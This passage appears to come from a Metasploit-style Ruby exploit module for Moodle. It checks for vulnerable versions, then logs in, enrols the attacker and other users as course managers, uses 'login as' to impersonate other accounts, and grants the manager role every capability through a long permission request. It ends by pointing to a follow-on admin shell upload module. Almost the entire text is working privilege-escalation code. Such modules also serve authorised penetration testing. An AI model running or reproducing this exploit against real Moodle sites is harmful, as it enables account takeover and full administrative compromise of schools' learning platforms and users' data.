keyboardlayout=1&quizaccess%2Fseb%3Amanage_seb_showreloadbutton=1&quizaccess%2Fseb%3Amanage_seb_showsebdownloadlink=1&quizaccess%2Fseb%3Amanage_seb_showsebtaskbar=1&quizaccess%2Fseb%3Amanage_seb_showtime=1&quizaccess%2Fseb%3Amanage_seb_showwificontrol=1&quizaccess%2Fseb%3Amanage_seb_templateid=1&quizaccess%2Fseb%3Amanage_seb_userconfirmquit=1&repository%2Fareafiles%3Aview=1&repository%2Fboxnet%3Aview=1&repository%2Fcontentbank%3Aview=1&repository%2Fcoursefiles%3Aview=1&repository%2Fdropbox%3Aview=1&repository%2Fequella%3Aview=1&repository%2Ffilesystem%3Aview=1&repository%2Fflickr%3Aview=1&repository%2Fflickr_public%3Aview=1&repository%2Fgoogledocs%3Aview=1&repository%2Flocal%3Aview=1&repository%2Fmerlot%3Aview=0&repository%2Fnextcloud%3Aview=1&repository%2Fonedrive%3Aview=1&repository%2Fpicasa%3Aview=1&repository%2Frecent%3Aview=1&repository%2Fs3%3Aview=1&repository%2Fskydrive%3Aview=1&repository%2Fupload%3Aview=1&repository%2Furl%3Aview=1&repository%2Fuser%3Aview=1&repository%2Fwebdav%3Aview=1&repository%2Fwikimedia%3Aview=1&repository%2Fyoutube%3Aview=1&block%2Factivity_modules%3Aaddinstance=1&block%2Factivity_results%3Aaddinstance=1&block%2Fadmin_bookmarks%3Aaddinstance=1&block%2Fbadges%3Aaddinstance=1&block%2Fblog_menu%3Aaddinstance=1&block%2Fblog_recent%3Aaddinstance=1&block%2Fblog_tags%3Aaddinstance=1&block%2Fcalendar_month%3Aaddinstance=1&block%2Fcalendar_upcoming%3Aaddinstance=1&block%2Fcomments%3Aaddinstance=1&block%2Fcompletionstatus%3Aaddinstance=1&block%2Fcourse_list%3Aaddinstance=1&block%2Fcourse_summary%3Aaddinstance=1&block%2Ffeedback%3Aaddinstance=1&block%2Fglobalsearch%3Aaddinstance=1&block%2Fglossary_random%3Aaddinstance=1&block%2Fhtml%3Aaddinstance=1&block%2Flogin%3Aaddinstance=1&block%2Fmentees%3Aaddinstance=1&block%2Fmnet_hosts%3Aaddinstance=1&block%2Fmyprofile%3Aaddinstance=1&block%2Fnavigation%3Aaddinstance=1&block%2Fnews_items%3Aaddinstance=1&block%2Fonline_users%3Aaddinstance=1&block%2Fonline_users%3Aviewlist=1&block%2Fprivate_files%3Aaddinstance=1&block%2Fquiz_results%3Aaddinstance=1&block%2Frecent_activity%3Aaddinstance=1&block%2Frss_client%3Aaddinstance=1&block%2Frss_client%3Amanageanyfeeds=1&block%2Frss_client%3Amanageownfeeds=1&block%2Fsearch_forums%3Aaddinstance=1&block%2Fsection_links%3Aaddinstance=1&block%2Fselfcompletion%3Aaddinstance=1&block%2Fsettings%3Aaddinstance=1&block%2Fsite_main_menu%3Aaddinstance=1&block%2Fsocial_activities%3Aaddinstance=1&block%2Ftag_flickr%3Aaddinstance=1&block%2Ftag_youtube%3Aaddinstance=1&block%2Ftags%3Aaddinstance=1&moodle%2Fblock%3Aedit=1&moodle%2Fblock%3Aview=1&moodle%2Fsite%3Amanageblocks=1&savechanges=Save+changes"
    })
    fail_with(Failure::Unreachable, 'Error changing manager role permissions') unless res
  end

  def check
    return Exploit::CheckCode::Unknown('No web server or moodle instance found') unless moodle_and_online?

    v = moodle_version
    return Exploit::CheckCode::Detected('Unable to determine moodle version') if v.nil?

    # https://moodle.org/mod/forum/discuss.php?d=407393
    v = Rex::Version.new(v)
    if v.between?(Rex::Version.new('3.9'), Rex::Version.new('3.9.1')) ||
       v.between?(Rex::Version.new('3.8'), Rex::Version.new('3.8.4')) ||
       v.between?(Rex::Version.new('3.7'), Rex::Version.new('3.7.7')) ||
       v.between?(Rex::Version.new('3.5'), Rex::Version.new('3.5.13')) ||
       v.between?(Rex::Version.new('3'), Rex::Version.new('3.5'))
      return Exploit::CheckCode::Appears("Exploitable Moodle version #{v} detected")
    end

    Exploit::CheckCode::Safe("Non-exploitable Moodle version #{v} detected")
  end

  def run
    print_status("Authenticating as user: #{datastore['USERNAME']}")
    cookies = moodle_login(datastore['USERNAME'], datastore['PASSWORD'])
    fail_with(Failure::NoAccess, 'Unable to login. Check credentials') if cookies.nil? || cookies.empty?
    cookies.each do |cookie|
      cookie_jar.add(cookie)
    end

    userid, courseid, sesskey = get_user_info
    print_good("User ID: #{userid}")
    print_good("Course ID: #{courseid}")
    print_good("Sessionkey: #{sesskey}")
    print_status('Retrieving course enrollment id')
    enrolid = get_course_enrol_id(courseid)
    print_good("Enrol ID: #{enrolid}")
    print_status('enroling self in class as manager')
    success = enrol(userid, courseid, enrolid, sesskey)
    fail_with(Failure::NoAccess, 'Unable to enrol in course') unless success
    print_good('Successfully enrolled')
    print_status('enroling a manager in class')
    Array(2...datastore['MAXUSERS']).each do |id|
      next if id == userid

      print_status("Attempting user: #{id}")
      success = enrol(id, courseid, enrolid, sesskey, '5')
      fail_with(Failure::NoAccess, 'Unable to enrol in course') unless success
      print_good('Successfully enrolled')
    end
    print_status('Retrieving course context id')
    contextid = get_course_context_id(courseid)
    print_good("Context ID: #{contextid}")
    managers = get_course_managers(contextid)
    print_good("Enrolled user IDs: #{managers}")
    # loop through all maangers looking for a 'login as' link
    managers.each do |manager|
      next if manager == userid

      print_status("Attempting loginas for user id: #{manager}")
      res = moodle_loginas(courseid, manager, sesskey)
      res.body =~ %r{You are logged in as [^>]+>([^<]+)</span>}
      print_status("Logged in as: #{Regexp.last_match(1)}")
      if res.body.include?('Site administration')
        print_good('looks like a potential admin!')
      end
      res.body =~ /"sesskey":"(.*?)"/
      new_sesskey = Regexp.last_match(1)
      print_status("Attempting via new session key: #{new_sesskey}")
      give_manager_all_permissions(new_sesskey)
      print_status('Checking if permissions were set successfully')
      res = send_request_cgi({
        'uri' => normalize_uri(target_uri.path, 'admin', 'search.php')
      })
      fail_with(Failure::Unreachable, 'Error retrieving settings') unless res
      if res.body.include?('Install plugins')
        print_good('Manager roll full permissioned, try exploit/multi/http/moodle_admin_shell_upload')
        return
      end
    end
    print_bad('Failed to upgrade permissions on manager roll')
  end

  # prefer cleanup over on_session since we may have changed things, regardless of successful exploit
  # def cleanup
  #  print_status('Sleeping 5 seconds before cleanup')
  #  Rex.sleep(5)
  #  print_status("Authenticating as user: #{datastore['USERNAME']}")
  #  cookie_jar.clear # clear cookies to prevent timeouts
  #  cookies = moodle_login(datastore['USERNAME'], datastore['PASSWORD'])
  #  if cookies.nil? || cookies.empty?
  #    print_bad('Failed login during cleanup')
  #  else
  #    cookies.each do |cookie|
  #      cookie_jar.add(cookie)
  #    end
  #    # XXX reset
  #  end
  #  super
  # end
end
